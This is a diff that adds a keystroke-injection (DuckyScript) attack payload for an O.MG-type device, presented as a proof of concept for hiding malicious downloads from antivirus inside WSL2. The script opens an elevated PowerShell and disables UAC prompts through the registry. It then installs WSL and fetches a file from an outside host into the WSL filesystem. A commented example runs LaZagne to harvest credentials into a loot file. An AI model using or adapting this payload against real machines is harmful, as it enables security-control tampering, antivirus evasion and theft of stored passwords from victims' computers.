@@ -1,0 +1,52 @@
+REM Title: HideInWSL
+REM Author: mylorik
+REM Description: 
+REM This payload is a POC of downloading a malicious file, like EICAR, while avoiding Windows Defender and 3rd party antivirus solutions without any tampering!
+REM This is done by downloading the file to the WSL2 distro
+REM Target: Windows 11 (Windows 10 1903+)
+REM System: OMG, firmware 3
+REM Details:
+REM While the antivirus cannot detect the downloaded file, it may be detected during Execution of that bad file, but even then it cannot remove the file from WSL2 distro!
+REM In my testing, LaZagne.exe can be downloaded and executed, you will get the loot, the antivirus will detect the execution and kill the process at some point, but you will get all loot and the file will remain in the WSL2 distro                       
+
+
+REM initial enumeration delay
+DELAY 2000
+
+REM change to your target language
+DUCKY_LANG us
+
+REM adjust DELAY to your system
+
+GUI r
+DELAY 100
+
+REM Open the Powershell as Administrator
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 300
+ALT y
+
+DELAY 200
+
+REM Disabling the UAC (wsl --install would ask for it)
+STRINGLN Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
+
+REM We do not need to enable these, but here for reference. wsl --install will automatically enable VirtualMachinePlatform
+REM STRINGLN dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart
+REM STRINGLN dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart
+
+REM Install WSL2
+STRINGLN wsl --install
+STRINGLN wsl --install Ubuntu
+
+REM We wait for the above two comanads to finish, at the end of "wsl --install Ubuntu" it will ask you to create username:password for Ubuntu, we don't have to provide it
+DELAY 55000
+CTRL c
+
+REM in Windows 10 the path may look different 
+REM download malicious file to the WSL2 distro
+STRINGLN wget https://secure.eicar.org/eicar.com.txt -O Microsoft.PowerShell.Core\FileSystem::\\wsl.localhost\Ubuntu\eicar.com.txt
+
+REM at this point you may execute the file downloaded above
+REM for example powershell -c "Microsoft.PowerShell.Core\FileSystem::\\wsl.localhost\Ubuntu\LaZagne.exe all -vv > "Microsoft.PowerShell.Core\FileSystem::\\wsl.localhost\Ubuntu\loot.txt";
